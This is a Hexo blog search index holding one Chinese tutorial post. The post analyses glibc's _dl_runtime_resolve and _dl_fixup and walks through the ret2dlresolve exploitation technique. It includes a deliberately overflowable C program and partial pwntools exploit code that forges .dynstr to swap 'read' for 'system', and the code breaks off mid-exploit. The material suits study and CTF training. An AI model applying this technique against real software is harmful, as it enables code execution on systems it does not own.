<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>关于_dl_runtime_resolve分析与ret2dlresolve</title>
      <link href="/2021/08/13/%E5%85%B3%E4%BA%8E_dl_runtime_resolve%E5%88%86%E6%9E%90%E4%B8%8Eret2dlresolve/"/>
      <url>/2021/08/13/%E5%85%B3%E4%BA%8E_dl_runtime_resolve%E5%88%86%E6%9E%90%E4%B8%8Eret2dlresolve/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>之前总结了静态链接和动态链接的过程，这次我们要真正讨论一下ret2dl的攻击方法。在此之前我们需要把_dl_runtime_resolve进行一下分析。</p><h1 id="dl-runtime-resolve分析"><a href="#dl-runtime-resolve分析" class="headerlink" title="_dl_runtime_resolve分析"></a>_dl_runtime_resolve分析</h1><p>我在网上查到资料是这个函数在<em>\sysdeps\x86_64\dl-trampoline.S</em>路径里。但是里面没有找该函数的代码实现，我又看了看他的头文件，实际上的代码的实现是保存在<em>\sysdeps\x86_64\dl-trampoline.h</em>里。代码是用汇编实现的，</p><figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="meta">.text</span></span><br><span class="line"><span class="meta">.globl</span> _dl_runtime_resolve</span><br><span class="line"><span class="meta">.hidden</span> _dl_runtime_resolve</span><br><span class="line"><span class="meta">.type</span> _dl_runtime_resolve, @function</span><br><span class="line"><span class="meta">.align</span> <span class="number">16</span></span><br><span class="line">cfi_startproc</span><br><span class="line"><span class="symbol">_dl_runtime_resolve:</span></span><br><span class="line">cfi_adjust_cfa_offset(<span class="number">16</span>) # Incorporate PLT</span><br><span class="line">#if DL_RUNIME_RESOLVE_REALIGN_STACK</span><br><span class="line"># if LOCAL_STORAGE_AREA != <span class="number">8</span></span><br><span class="line">#  error LOCAL_STORAGE_AREA must be <span class="number">8</span></span><br><span class="line"># endif</span><br><span class="line">pushq %rbx# <span class="keyword">push</span> subtracts stack by <span class="number">8</span>.</span><br><span class="line">cfi_adjust_cfa_offset(<span class="number">8</span>)</span><br><span class="line">cfi_rel_offset(%rbx, <span class="number">0</span>)</span><br><span class="line"><span class="keyword">mov</span> %RSP_LP, %RBX_LP</span><br><span class="line">cfi_def_cfa_register(%rbx)</span><br><span class="line"><span class="keyword">and</span> $-VEC_SIZE, %RSP_LP</span><br><span class="line">#endif</span><br><span class="line"><span class="keyword">sub</span> $REGISTER_SAVE_AREA, %RSP_LP</span><br><span class="line">cfi_adjust_cfa_offset(REGISTER_SAVE_AREA)</span><br><span class="line"># Preserve registers otherwise clobbered.</span><br><span class="line"><span class="keyword">movq</span> %rax, REGISTER_SAVE_RAX(%rsp)</span><br><span class="line"><span class="keyword">movq</span> %rcx, REGISTER_SAVE_RCX(%rsp)</span><br><span class="line"><span class="keyword">movq</span> %rdx, REGISTER_SAVE_RDX(%rsp)</span><br><span class="line"><span class="keyword">movq</span> %rsi, REGISTER_SAVE_RSI(%rsp)</span><br><span class="line"><span class="keyword">movq</span> %rdi, REGISTER_SAVE_RDI(%rsp)</span><br><span class="line"><span class="keyword">movq</span> %r8, REGISTER_SAVE_R8(%rsp)</span><br><span class="line"><span class="keyword">movq</span> %r9, REGISTER_SAVE_R9(%rsp)</span><br><span class="line">VMOV %VEC(<span class="number">0</span>), (REGISTER_SAVE_VEC_OFF)(%rsp)</span><br><span class="line">VMOV %VEC(<span class="number">1</span>), (REGISTER_SAVE_VEC_OFF + VEC_SIZE)(%rsp)</span><br><span class="line">VMOV %VEC(<span class="number">2</span>), (REGISTER_SAVE_VEC_OFF + VEC_SIZE * <span class="number">2</span>)(%rsp)</span><br><span class="line">VMOV %VEC(<span class="number">3</span>), (REGISTER_SAVE_VEC_OFF + VEC_SIZE * <span class="number">3</span>)(%rsp)</span><br><span class="line">VMOV %VEC(<span class="number">4</span>), (REGISTER_SAVE_VEC_OFF + VEC_SIZE * <span class="number">4</span>)(%rsp)</span><br><span class="line">VMOV %VEC(<span class="number">5</span>), (REGISTER_SAVE_VEC_OFF + VEC_SIZE * <span class="number">5</span>)(%rsp)</span><br><span class="line">VMOV %VEC(<span class="number">6</span>), (REGISTER_SAVE_VEC_OFF + VEC_SIZE * <span class="number">6</span>)(%rsp)</span><br><span class="line">VMOV %VEC(<span class="number">7</span>), (REGISTER_SAVE_VEC_OFF + VEC_SIZE * <span class="number">7</span>)(%rsp)</span><br><span class="line">#ifndef __ILP32__</span><br><span class="line"># We also have to preserve <span class="keyword">bound</span> registers.  These are nops if</span><br><span class="line"># Intel MPX isn<span class="string">&#x27;t available or disabled.</span></span><br><span class="line"><span class="string"># ifdef HAVE_MPX_SUPPORT</span></span><br><span class="line"><span class="string">bndmov %bnd0, REGISTER_SAVE_BND0(%rsp)</span></span><br><span class="line"><span class="string">bndmov %bnd1, REGISTER_SAVE_BND1(%rsp)</span></span><br><span class="line"><span class="string">bndmov %bnd2, REGISTER_SAVE_BND2(%rsp)</span></span><br><span class="line"><span class="string">bndmov %bnd3, REGISTER_SAVE_BND3(%rsp)</span></span><br><span class="line"><span class="string"># else</span></span><br><span class="line"><span class="string">#  if REGISTER_SAVE_BND0 == 0</span></span><br><span class="line"><span class="string">.byte 0x66,0x0f,0x1b,0x04,0x24</span></span><br><span class="line"><span class="string">#  else</span></span><br><span class="line"><span class="string">.byte 0x66,0x0f,0x1b,0x44,0x24,REGISTER_SAVE_BND0</span></span><br><span class="line"><span class="string">#  endif</span></span><br><span class="line"><span class="string">.byte 0x66,0x0f,0x1b,0x4c,0x24,REGISTER_SAVE_BND1</span></span><br><span class="line"><span class="string">.byte 0x66,0x0f,0x1b,0x54,0x24,REGISTER_SAVE_BND2</span></span><br><span class="line"><span class="string">.byte 0x66,0x0f,0x1b,0x5c,0x24,REGISTER_SAVE_BND3</span></span><br><span class="line"><span class="string"># endif</span></span><br><span class="line"><span class="string">#endif</span></span><br><span class="line"><span class="string"># Copy args pushed by PLT in register.</span></span><br><span class="line"><span class="string"># %rdi: link_map, %rsi: reloc_index</span></span><br><span class="line"><span class="string">mov (LOCAL_STORAGE_AREA + 8)(%BASE), %RSI_LP</span></span><br><span class="line"><span class="string">mov LOCAL_STORAGE_AREA(%BASE), %RDI_LP</span></span><br><span class="line"><span class="string">call _dl_fixup# Call resolver.</span></span><br><span class="line"><span class="string">mov %RAX_LP, %R11_LP# Save return value</span></span><br><span class="line"><span class="string">#ifndef __ILP32__</span></span><br><span class="line"><span class="string"># Restore bound registers.  These are nops if Intel MPX isn&#x27;</span>t</span><br><span class="line"># avaiable <span class="keyword">or</span> disabled.</span><br><span class="line"># ifdef HAVE_MPX_SUPPORT</span><br><span class="line"><span class="keyword">bndmov</span> REGISTER_SAVE_BND3(%rsp), %bnd3</span><br><span class="line"><span class="keyword">bndmov</span> REGISTER_SAVE_BND2(%rsp), %bnd2</span><br><span class="line"><span class="keyword">bndmov</span> REGISTER_SAVE_BND1(%rsp), %bnd1</span><br><span class="line"><span class="keyword">bndmov</span> REGISTER_SAVE_BND0(%rsp), %bnd0</span><br><span class="line"># else</span><br><span class="line"><span class="meta">.byte</span> <span class="number">0x66</span>,<span class="number">0x0f</span>,<span class="number">0x1a</span>,<span class="number">0x5c</span>,<span class="number">0x24</span>,REGISTER_SAVE_BND3</span><br><span class="line"><span class="meta">.byte</span> <span class="number">0x66</span>,<span class="number">0x0f</span>,<span class="number">0x1a</span>,<span class="number">0x54</span>,<span class="number">0x24</span>,REGISTER_SAVE_BND2</span><br><span class="line"><span class="meta">.byte</span> <span class="number">0x66</span>,<span class="number">0x0f</span>,<span class="number">0x1a</span>,<span class="number">0x4c</span>,<span class="number">0x24</span>,REGISTER_SAVE_BND1</span><br><span class="line">#  if REGISTER_SAVE_BND0 == <span class="number">0</span></span><br><span class="line"><span class="meta">.byte</span> <span class="number">0x66</span>,<span class="number">0x0f</span>,<span class="number">0x1a</span>,<span class="number">0x04</span>,<span class="number">0x24</span></span><br><span class="line">#  else</span><br><span class="line"><span class="meta">.byte</span> <span class="number">0x66</span>,<span class="number">0x0f</span>,<span class="number">0x1a</span>,<span class="number">0x44</span>,<span class="number">0x24</span>,REGISTER_SAVE_BND0</span><br><span class="line">#  endif</span><br><span class="line"># endif</span><br><span class="line">#endif</span><br><span class="line"># Get register content back.</span><br><span class="line"><span class="keyword">movq</span> REGISTER_SAVE_R9(%rsp), %r9</span><br><span class="line"><span class="keyword">movq</span> REGISTER_SAVE_R8(%rsp), %r8</span><br><span class="line"><span class="keyword">movq</span> REGISTER_SAVE_RDI(%rsp), %rdi</span><br><span class="line"><span class="keyword">movq</span> REGISTER_SAVE_RSI(%rsp), %rsi</span><br><span class="line"><span class="keyword">movq</span> REGISTER_SAVE_RDX(%rsp), %rdx</span><br><span class="line"><span class="keyword">movq</span> REGISTER_SAVE_RCX(%rsp), %rcx</span><br><span class="line"><span class="keyword">movq</span> REGISTER_SAVE_RAX(%rsp), %rax</span><br><span class="line">VMOV (REGISTER_SAVE_VEC_OFF)(%rsp), %VEC(<span class="number">0</span>)</span><br><span class="line">VMOV (REGISTER_SAVE_VEC_OFF + VEC_SIZE)(%rsp), %VEC(<span class="number">1</span>)</span><br><span class="line">VMOV (REGISTER_SAVE_VEC_OFF + VEC_SIZE * <span class="number">2</span>)(%rsp), %VEC(<span class="number">2</span>)</span><br><span class="line">VMOV (REGISTER_SAVE_VEC_OFF + VEC_SIZE * <span class="number">3</span>)(%rsp), %VEC(<span class="number">3</span>)</span><br><span class="line">VMOV (REGISTER_SAVE_VEC_OFF + VEC_SIZE * <span class="number">4</span>)(%rsp), %VEC(<span class="number">4</span>)</span><br><span class="line">VMOV (REGISTER_SAVE_VEC_OFF + VEC_SIZE * <span class="number">5</span>)(%rsp), %VEC(<span class="number">5</span>)</span><br><span class="line">VMOV (REGISTER_SAVE_VEC_OFF + VEC_SIZE * <span class="number">6</span>)(%rsp), %VEC(<span class="number">6</span>)</span><br><span class="line">VMOV (REGISTER_SAVE_VEC_OFF + VEC_SIZE * <span class="number">7</span>)(%rsp), %VEC(<span class="number">7</span>)</span><br><span class="line">#if DL_RUNIME_RESOLVE_REALIGN_STACK</span><br><span class="line"><span class="keyword">mov</span> %RBX_LP, %RSP_LP</span><br><span class="line">cfi_def_cfa_register(%rsp)</span><br><span class="line"><span class="keyword">movq</span> (%rsp), %rbx</span><br><span class="line">cfi_restore(%rbx)</span><br><span class="line">#endif</span><br><span class="line"># Adjust stack(PLT did <span class="number">2</span> pushes)</span><br><span class="line"><span class="keyword">add</span> $(LOCAL_STORAGE_AREA + <span class="number">16</span>), %RSP_LP</span><br><span class="line">cfi_adjust_cfa_offset(-(LOCAL_STORAGE_AREA + <span class="number">16</span>))</span><br><span class="line"># Preserve <span class="keyword">bound</span> registers.</span><br><span class="line">PRESERVE_BND_REGS_PREFIX</span><br><span class="line"><span class="keyword">jmp</span> *%r11# Jump to function address.</span><br><span class="line">cfi_endproc</span><br><span class="line"><span class="meta">.size</span> _dl_runtime_resolve, .-_dl_runtime_resolve</span><br></pre></td></tr></table></figure><p>这段代码的功能就是保存寄存器的值到栈里,然后调用_dl_fixup执行具体功能，然后从栈中恢复寄存器。而调用_dl_fixup传入的参数rdi是link_map,rsi是GOT中关于PLT重定位的索引，后面根据该索引寻找要传入的新地址。所以分析_dl_fixup对我们了解_dl_runtime_resolve是非常重要的。</p><h2 id="dl-fixup分析"><a href="#dl-fixup分析" class="headerlink" title="_dl_fixup分析"></a>_dl_fixup分析</h2><p>_dl_fixup是定义和实现是在\elf\dl-runtime.c中，先来分析一下代码。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">DL_FIXUP_VALUE_TYPE</span><br><span class="line">attribute_hidden __attribute ((noinline)) ARCH_FIXUP_ATTRIBUTE</span><br><span class="line">_dl_fixup (</span><br><span class="line"><span class="meta"># <span class="meta-keyword">ifdef</span> ELF_MACHINE_RUNTIME_FIXUP_ARGS</span></span><br><span class="line">   ELF_MACHINE_RUNTIME_FIXUP_ARGS,</span><br><span class="line"><span class="meta"># <span class="meta-keyword">endif</span></span></span><br><span class="line">   struct link_map *l, ElfW(Word) reloc_arg)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *<span class="keyword">const</span> symtab</span></span><br><span class="line"><span class="function">    </span>= (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[DT_SYMTAB]);</span><br><span class="line">    <span class="comment">//通过宏D_PTR获取获得动态链接符号表的地址，既得到.dynsym的指针。</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *strtab = (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[DT_STRTAB]);</span><br><span class="line"><span class="comment">//通过宏D_PTR获取获得动态链接字符串的地址，既得到.dynstr的指针。</span></span><br><span class="line">  <span class="keyword">const</span> PLTREL *<span class="keyword">const</span> reloc</span><br><span class="line">    = (<span class="keyword">const</span> <span class="keyword">void</span> *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);</span><br><span class="line">    <span class="comment">//reloc_offset就是传进来的第二个参数，GOT中关于PLT重定位的索引，将.rel.plt的地址与reloc_offset相加，得到该函数的ELF32_Rel的结构体指针。</span></span><br><span class="line">  <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *sym </span>= &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</span><br><span class="line">    <span class="comment">//得到r_info中里保存的重定位入口符号在符号表的下标，从而获取函数对应ELF32_sym的指针。</span></span><br><span class="line">  <span class="keyword">void</span> *<span class="keyword">const</span> rel_addr = (<span class="keyword">void</span> *)(l-&gt;l_addr + reloc-&gt;r_offset);</span><br><span class="line">    <span class="comment">//l-&gt;l_addr保存的是共享文件加载的基地址。这里的rel_addr是基地址l-&gt;l_addr加上got表在共享对象的偏移reloc-&gt;r_offset，得到我们要修改的got表所在的位置。</span></span><br><span class="line">  <span class="keyword">lookup_t</span> result;</span><br><span class="line">  DL_FIXUP_VALUE_TYPE value;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Sanity check that we&#x27;re really looking at a PLT relocation.  */</span></span><br><span class="line">  assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);</span><br><span class="line"><span class="comment">//这里是检查r_info中的重定位入口类型是否是R_386_JMP_SLOT,动态链接中函数重定位一般都为R_386_JMP_SLOT，也就是7</span></span><br><span class="line">   <span class="comment">/* Look up the target symbol.  If the normal lookup rules are not</span></span><br><span class="line"><span class="comment">      used don&#x27;t look in the global scope.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), <span class="number">0</span>) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">//这里判断函数是否被解析过，如果(sym-&gt;st_other)&amp;0x03结果为0，说明没有解析过，不属于STV_PROTECTED、STV_HIDDEN或者STV_INTERNAL其中任何一种。</span></span><br><span class="line">      <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">r_found_version</span> *<span class="title">version</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Half)</span> *vernum </span>=</span><br><span class="line">    (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);</span><br><span class="line">  ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>;</span><br><span class="line">  version = &amp;l-&gt;l_versions[ndx];</span><br><span class="line">  <span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>)</span><br><span class="line">    version = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">      <span class="comment">//这部分获取version信息，我们可以发现version是使用我们的r_info进行赋值，如果我们r_info的重定位入口符号下标异常从而导致ndx数值异常，很可能导致l_versions[ndx]数组越界到不可读位置导致程序崩溃。</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/* We need to keep the scope around so do some locking.  This is</span></span><br><span class="line"><span class="comment"> not necessary for objects which cannot be unloaded or when</span></span><br><span class="line"><span class="comment"> we are not using any threads (yet).  */</span></span><br><span class="line">      <span class="keyword">int</span> flags = DL_LOOKUP_ADD_DEPENDENCY;</span><br><span class="line">      <span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P)</span><br><span class="line">&#123;</span><br><span class="line">  THREAD_GSCOPE_SET_FLAG ();</span><br><span class="line">  flags |= DL_LOOKUP_GSCOPE_LOCK;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> RTLD_ENABLE_FOREIGN_CALL</span></span><br><span class="line">      RTLD_ENABLE_FOREIGN_CALL;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">      result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,</span><br><span class="line">    version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* We are done with the global scope.  */</span></span><br><span class="line">      <span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P)</span><br><span class="line">THREAD_GSCOPE_RESET_FLAG ();</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> RTLD_FINALIZE_FOREIGN_CALL</span></span><br><span class="line">      RTLD_FINALIZE_FOREIGN_CALL;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Currently result contains the base load address (or link map)</span></span><br><span class="line"><span class="comment"> of the object that defines sym.  Now add in the symbol</span></span><br><span class="line"><span class="comment"> offset.  */</span></span><br><span class="line">      value = DL_FIXUP_MAKE_VALUE (result,</span><br><span class="line">   sym ? (LOOKUP_VALUE_ADDRESS (result)</span><br><span class="line">  + sym-&gt;st_value) : <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* We already found the symbol.  The module (and therefore its load</span></span><br><span class="line"><span class="comment"> address) is also known.  */</span></span><br><span class="line">      value = DL_FIXUP_MAKE_VALUE (l, l-&gt;l_addr + sym-&gt;st_value);</span><br><span class="line">      result = l;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* And now perhaps the relocation addend.  */</span></span><br><span class="line">  value = elf_machine_plt_value (l, reloc, value);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (sym != <span class="literal">NULL</span></span><br><span class="line">      &amp;&amp; __builtin_expect (ELFW(ST_TYPE) (sym-&gt;st_info) == STT_GNU_IFUNC, <span class="number">0</span>))</span><br><span class="line">    value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value));</span><br><span class="line"><span class="comment">//这一部分先通过strtab（字符串表的基地址）加上st_name（字符串对应字符串表的下标）得到函数的字符串，从已经装载的共享库找到最终符号的地址，得到符号对其重定位，加上libc的装载地址得到最终地址，保存在value中</span></span><br><span class="line">  <span class="comment">/* Finally, fix up the plt itself.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (GLRO(dl_bind_not)))</span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> elf_machine_fixup_plt (l, result, reloc, rel_addr, value);</span><br><span class="line">    <span class="comment">//这部分是使用elf_machine_fixup_plt对函数地址进行修正，将函数真实地址写入got表</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们总结一下刚刚分析好的_dl_runtime_resolve过程</p><ol><li>首先获取后面需要使用的地址：<ul><li>通过宏D_PTR获取获得动态链接符号表的地址，动态链接字符串</li><li>获取.rel.plt的地址，将.rel.plt的地址与reloc_offset相加，得到该函数的ELF32_Rel的结构体指针</li><li>得到r_info中里保存的重定位入口符号在符号表的下标，从而获取函数对应ELF32_sym的指针。</li><li>基地址l-&gt;l_addr加上got表在共享对象的偏移reloc-&gt;r_offset，得到我们要修改的got表所在的位置。</li></ul></li><li>接下来做一些检查：<ul><li>检查r_info中的重定位入口类型是否是R_386_JMP_SLOT</li><li>判断函数是否被解析过，是否属于属于STV_PROTECTED、STV_HIDDEN或者STV_INTERNAL其中任何一种。</li></ul></li><li>紧接着获取version信息，通过strtab（字符串表的基地址）加上st_name（字符串对应字符串表的下标）得到函数的字符串，从已经装载的共享库找到最终符号的地址，得到符号对其重定位，加上libc的装载地址得到最终地址，保存在value中，最后对函数地址进行修正，将函数真实地址写入got表</li></ol><p>了解了_dl_runtime_resolve的基本过程，接下来我们来看看攻击的手法吧</p><h1 id="ret2dlresolve"><a href="#ret2dlresolve" class="headerlink" title="ret2dlresolve"></a>ret2dlresolve</h1><h2 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h2><p>从最直接的角度去想直接去修改.dynsym、.dynstr或者是修改.rel.plt，但是存在一些问题，我们会发现这些segment是不可写的，也就是说我们无法通过修改它们达到我们的目的。</p><ol><li><p>让我们换个思路，既然不能直接改写这些segment，是否可以间接控制到它们那？看看_dl_runtime_resolve过程的第一步，所有的地址索引都是从<strong>.dynamic</strong>开始的,也就是说，我们如果控制了.dynamic也就控制了整个动态链接的过程，也就可以实现执行目标代码。比如我们通过其劫持到strtab，我们既可以根据st_name的偏移伪造出字符串表，比如将write的偏移地方写上system，这样就可以到达我们执行目的函数的目标。但是这种方法的局限性较强，得No RELRO才行</p></li><li><p>再者我们先伪造出<strong>Elf32_Rel</strong>和<strong>Elf32_Sym</strong>两个结构体，并传入的虚假的reloc_offset参数，我们对reloc_offset做一个修改使得其位置发生偏移，通过虚假的reloc_arg使得程序流读取我们伪造的结构体，进而取得我们伪造的偏移量，最终取得伪造的函数字符串。这样也可以达到我们的目的，但是要注意这种方法存在一定的问题，其不能用于x64的架构在上面分析的代码里有这样一段</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="keyword">if</span> (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Half)</span> *vernum </span>=</span><br><span class="line">    (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);</span><br><span class="line">  ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>;</span><br><span class="line">  version = &amp;l-&gt;l_versions[ndx];</span><br><span class="line">  <span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>)</span><br><span class="line">    version = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们在64位条件下，我们程序的bss段是被映射到0x600000的，那么我们伪造的.dynsym也会在这个地址之后，而d_ptr是在0x400000，这样在取下标的时候很可能会很大从而取到二者之间的不可读区域</p></li><li><p>我们还是看看_dl_runtime_resolve的第一步，可以看到除了.dynamic之外，我们索引也通过D_PTR，也就是说如果我们<strong>伪造link_map</strong>，也就可以做到控制程序到目的函数。</p></li></ol><h2 id="攻击实战"><a href="#攻击实战" class="headerlink" title="攻击实战"></a>攻击实战</h2><h3 id="32位下通过修改-dynamic进行攻击（NO-RELOR）"><a href="#32位下通过修改-dynamic进行攻击（NO-RELOR）" class="headerlink" title="32位下通过修改.dynamic进行攻击（NO RELOR）"></a>32位下通过修改.dynamic进行攻击（NO RELOR）</h3><p>我们先实验一下第一种攻击方式，由于没有现成的程序，所以我改写了一下XMan2016的level3</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//gcc -fno-stack-protector -m32 -z norelro -no-pie level3.c -o level3_norelro_32</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vuln</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line">write(<span class="number">1</span>, <span class="string">&quot;Input:\n&quot;</span>, <span class="number">7u</span>);</span><br><span class="line">read(<span class="number">0</span>, buf, <span class="number">0x200</span>u);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    vuln();</span><br><span class="line">    write(<span class="number">1</span>, <span class="string">&quot;Hello, World!\n&quot;</span>, <span class="number">0xE</span>u);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们来checksec一下</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210815210044087.png" alt="checksec"></p><p>确定是没有开RELRO的</p><p>先看一下偏移大小</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210815211051440.png" alt="偏移"></p><p>我们先确定一下后面要使用到的一些地址</p><p>接下来我们要寻找到read存放跳转到_dl_runtime_resolve的地址，也就是got表一开始填写的地址，可以使用gdb来查看</p><p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20210817110724393.png" alt="通过got.plt寻找代码"></p><p>这样我们就得到了<code>push 0x0 jmp _dl_runtime_resolve</code>的地址</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">offsetct=<span class="number">112</span></span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_plt=elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">read_dl=<span class="number">0x08049040</span></span><br><span class="line"></span><br><span class="line">pop_esi_edi_ebp_ret=<span class="number">0x080492b1</span></span><br><span class="line">pop_ebp_ret=<span class="number">0x080492b3</span></span><br><span class="line">leave_ret=<span class="number">0x08049125</span></span><br></pre></td></tr></table></figure><p>接下来还需要通过gdb来寻找dynstr地址在dynamic中保存的地址,由于我没有找到这个api,也不知道有没有,只能采用下面的方法</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">dynamic_addr=elf.get_section_by_name(<span class="string">&#x27;.dynamic&#x27;</span>).header.sh_addr<span class="comment">#获取dynamic的地址</span></span><br><span class="line">dynstr_addr=elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).header.sh_addr<span class="comment">#获取dynstr的地址</span></span><br><span class="line">success(<span class="string">&#x27;dynamic : &#x27;</span>+<span class="built_in">hex</span>(dynamic_addr))</span><br><span class="line">success(<span class="string">&#x27;dynstr : &#x27;</span>+<span class="built_in">hex</span>(dynstr_addr))</span><br><span class="line">gdb.attach(io)</span><br><span class="line">pause()</span><br></pre></td></tr></table></figure><p>调用gdb</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210816211031209.png" alt="查看地址"></p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210816211053995.png" alt="调用gdb"></p><p>我们可以看到该地址位于<em>0x804b208</em>,或者还有一个办法</p><p>使用<code>readelf -d level3_norelro_32</code>来查看.dynamic</p><p>数一数STRTAB的偏移</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210816211622145.png" alt="查看偏移"></p><p>那么其地址即为<code>dynamic_addr+str_offset*0x8+4</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">dynamic_addr=elf.get_section_by_name(<span class="string">&#x27;.dynamic&#x27;</span>).header.sh_addr</span><br><span class="line">dynstr_addr=elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).header.sh_addr</span><br><span class="line">success(<span class="string">&#x27;dynamic : &#x27;</span>+<span class="built_in">hex</span>(dynamic_addr))</span><br><span class="line">success(<span class="string">&#x27;dynstr : &#x27;</span>+<span class="built_in">hex</span>(dynstr_addr))</span><br><span class="line">str_offsetct=<span class="number">0x8</span></span><br><span class="line">dynamic_dynstr_addr=dynamic_addr+str_offsetct*<span class="number">0x8</span>+<span class="number">0x4</span></span><br><span class="line"></span><br><span class="line">bss_addr=elf.get_section_by_name(<span class="string">&#x27;.bss&#x27;</span>).header.sh_addr<span class="comment">#获取bss的地址</span></span><br><span class="line">fake_stack=bss_addr+<span class="number">0x400</span><span class="comment">#在bss上做一个偏移为我们的栈基址</span></span><br><span class="line">dynstr=elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).data()<span class="comment">#获取.dynstr的内容</span></span><br><span class="line">fake_dynstr=dynstr.replace(<span class="string">&quot;read&quot;</span>,<span class="string">&quot;system&quot;</span>)<span 